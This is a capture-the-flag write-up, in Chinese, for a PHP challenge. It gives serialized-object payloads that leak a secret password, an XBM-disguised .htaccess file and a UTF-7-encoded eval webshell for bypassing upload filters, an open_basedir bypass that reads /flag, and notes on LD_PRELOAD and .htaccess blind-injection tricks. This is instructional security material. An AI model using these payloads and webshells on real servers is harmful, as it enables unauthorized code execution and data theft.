## php tricks

题目直接给出源码，include了一个secret.php，有两个类GetPass和Upload，可以进行反序列化或文件上传，但文件上传需要验证secret.php中的\$pass变量。因此思路很清晰：首先通过反序列化和GetPass类获取\$pass，然后通过Upload类上传webshell。

GetPass类如下：

```php
class GetPass
{
    public $abandon,$boring,$code;

    function read()
    {
        ob_start();
        global $hidden;
        print $hidden;
    }

    function __destruct()
    {
        $abandon = $this->abandon;
        $boring = $this->boring;
        $code = $this->code;
        $abandon->$boring();
        if(!(is_object($abandon)) ||!(is_string($boring)) || !(is_string($code)))
        {
            ob_end_clean();
            exit();
        }
        global $$code;
        $hidden = $GLOBALS['pass'];
        ob_end_clean();
    }
}
```

read()可以读取变量并输出，但会输出至缓冲区，正常执行至最后会执行ob_end_clean()清空缓冲区，没有任何回显，因此需要想办法使程序异常退出，跳过ob_end_clean()的执行。

注意到代码中有global \$\$code字段，我们只需使\$code=this，执行至global \$this就会报错，从而正常输出。

Payload以如下方式生成：

```php
$a=new GetPass();
$a->abandon=$a;
$a->boring='read';
$a->code='hidden';
$b=new GetPass();
$b->abandon=$b;
$b->boring='read';
$b->code='this';
echo serialize([$a,$b]);
```

第一个类执行global \$hidden，声明全局变量\$pass，第二个类执行read()输出至缓冲区，然后执行global \$this报错退出，从而打出\$pass。

Payload:

```
?obj=a:2:{i:0;O:7:"GetPass":3:{s:7:"abandon";r:2;s:6:"boring";s:4:"read";s:4:"code";s:6:"hidden";}i:1;O:7:"GetPass":3:{s:7:"abandon";r:6;s:6:"boring";s:4:"read";s:4:"code";s:4:"this";}}
```

或者也可以使用另一种Payload，本质上都是先赋值'hidden'再赋值'this'：

```
?obj=O:7:"GetPass":3:{s:7:"abandon";O:7:"GetPass":3:{s:7:"abandon";r:1;s:6:"boring";s:4:"read";s:4:"code";s:4:"this";}s:6:"boring";s:4:"read";s:4:"code";s:6:"hidden";}
```



Upload类如下：

```php
class Upload
{
    protected $upload_dir = "";
    protected $filename = "";
    protected $tmp_filename = "";

    function __construct($upload_dir, $filename, $tmp_filename)
    {
        $this->upload_dir = $upload_dir;
        $this->filename = $filename;
        $this->tmp_filename = $tmp_filename;

        $this->setDir();

        if(!$this->checkExtension())
            die("I want a pic, not a php!!");

        if(!$this->checkType())
            die("It doesn't look like a pic...");

        if(!$this->checkSize())
            die("I want a pic with a size of 1337*1337 ^_^");

        if(!$this->checkContents())
            die("Why would you need php in a pic...");

        if(!move_uploaded_file($this->tmp_filename, $this->upload_dir.$this->filename))
            die("Something seems to be wrong.");

        print_r($this->upload_dir.$this->filename);
    }

    function setDir()
    {
        if(!file_exists($this->upload_dir))
            mkdir($this->upload_dir);
    }

    function checkExtension()
    {
        $extension = substr($this->filename, strrpos($this->filename,".")+1);
        if(preg_match("/ph/i",$extension))
            return FALSE;
        else
            return TRUE;
    }

    function checkType()
    {
        if(!exif_imagetype($this->tmp_filename))
            return FALSE;
        else
            return TRUE;
    }

    function checkSize()
    {
        $image_size = getimagesize($this->tmp_filename);
        if ($image_size[0] !== 1337 || $image_size[1] !== 1337)
            return FALSE;
        else
            return TRUE;
    }

    function checkContents()
    {
        if(mb_strpos(file_get_contents($this->tmp_filename), '<?') !== False)
            return FALSE;
        else
            return TRUE;
    }
}
```

限制如下：

- 后缀名不能以ph开头

- exif_imagetype检测必须为图片

- getimagesize获取到的图片长宽必须均为1337

- 文件内容不能含有<?

绕过后缀名检测可以上传.htaccess文件；绕过exif_imagetype和getimagesize可以上传xbm格式的文件，即以

```
#define width 1337
#define height 1337
```

开头；文件内容检测可以通过编码绕过，如utf-7、utf-16。

上传.htaccess:

```
#define width 1337
#define height 1337
AddType application/x-httpd-php .abc
php_flag display_errors on
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
```

上传shell.abc:

```
#define width 1337
#define height 1337
+ADw?php eval(+ACQAXw-POST+AFs'cmd'+AF0)+ADs?+AD4-
```

然后直接访问shell.abc即可RCE。



RCE后发现常用函数均被禁用，open_basedir限制为/var/www/html:/tmp

接下来有三种思路：

1. 绕过open_basedir：

```
cmd=ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/flag');
```

2. 绕过disable_functions：

disable_functions中没有过滤putenv()，可以设置环境变量LD_PRELOAD为我们自己编译的恶意动态链接库，然后调用error_log、mail等调用了系统函数的函数，即可实现RCE，详见exp。

3. 使用.htaccess的If标签进行盲注

这个姿势是从津门杯Nu1L的Writeup中学到的，非常骚气的一种做法。

```
<If "file('/flag')=~ /flag{xxx/">
ErrorDocument 404 "or4nge"
</If>
```

参照apache官方文档http://httpd.apache.org/docs/2.4/expr.html，可以在.htaccess中使用if标签对flag进行正则匹配，若匹配成功则返回404，并返回"or4nge"，盲注即可获得flag，详见exp。

### flag

flag{fe6985e2-9fc6-4306-b75f-4c466f777a84}

